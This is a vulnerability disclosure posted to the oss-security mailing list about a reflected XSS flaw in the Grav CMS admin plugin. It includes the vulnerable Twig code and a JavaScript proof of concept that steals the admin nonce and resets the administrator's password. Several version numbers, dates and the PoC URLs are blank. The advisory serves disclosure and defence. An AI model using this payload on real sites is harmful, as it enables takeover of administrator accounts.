  oss-security - Grav CMS admin plugin Reflected Cross Site Scripting  (XSS) vulnerability            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 15 Mar From: Sydream Labs <labs@...dream.com> To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com Subject: Grav CMS admin plugin Reflected Cross Site Scripting  (XSS) vulnerability  # Grav CMS admin plugin Reflected Cross Site Scripting (XSS) vulnerability  ## Description  Grav CMS is a flat-file CMS using Markdown files for content management ([Official Website](https://getgrav.org/)).  It has been elected "Best Open Source CMS of by [CMS  The application does not always filter user input correctly, thereby allowing an attacker to inject arbitrary Web content in the response of the server (reflected Cross Site Scripting).  **CVE ID**:  **Access Vector**: remote  **Security Risk**: high  **Vulnerability**: CWE-79  **CVSS Base Score**: 7.4  **CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N   ## Details  On lines and of `system/src/Grav/Common/Twig/Twig.php`, unfiltered user input is passed in the `$error_msg` variable.  ``` $output = $this->twig->render($template, $twig_vars); } catch (\Twig_Error_Loader $e) {  .. snip ..              throw new \RuntimeException($error_msg, $e);         }     } else {         throw new \RuntimeException($error_msg, $e);     } } ```  As a result, generating an exception by accessing `/admin/tools/someunexistingpage` and manipulating the `someunexistingpage` part of the URL allows to inject arbitrary Web content into the server's response.  ## Proof of Concept #1  Visiting the following page:  ``` ```  will cause the execution of the `alert(1)` JavaScript code in the context of the visitor's browser.  ## Proof of Concept #2  By tricking a logged-in admin into visiting a malicious link, any unauthenticated user can elevate its privileges to site administration.  Here follows a Proof of Concept code which:  1. Grabs the `admin-nonce` of the logged-in admin 2. Prints that nonce 3. Uses it to change the current admin's password to `Password7`  ``` <script  <script> adminNonce = ""; $.get( "/admin/user/admin", function( data ) {adminNonce = $("input[name=admin-nonce]", data).val()}).done( function(){ alert(window.adminNonce); $.post( "/admin/user/admin", {     "task": "save",         "admin-nonce": adminNonce,     "data[password]": "Password7"},     function(data){document.write(data)})} ); </script> ```  Here is the base64 encoded version of the payload, injected in the malicious link:  ``` ```  Now, after the attacker tricks a logged-in admin into clicking on this link, the admin's password is changed to the attacker controlled value. Thus, the attacker can log in with `Password7` and navigate inside the administration interface.   ## Timeline (dd/mm/yyyy)  * : Initial discovery * : Contact with the editor (email address) * : Editor acknowledges the report * : Sending further details and PoC code to the editor * : Editor fixes the vulnerability * : Advisory publication  ## Fixes  Upgrade to version and above (currently  ## Affected versions  * Version (last stable version as of - previous versions are probably also vulnerable but not tested)  ## Credits  * Kevin LOCATI <k.locati@...dream.com>   --  SYSDREAM Labs <labs@...dream.com>  GPG : C43E 2A2E 8EB4 8CD9 D5B2  * Website: https://sysdream.com/ * Twitter: @sysdream    Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      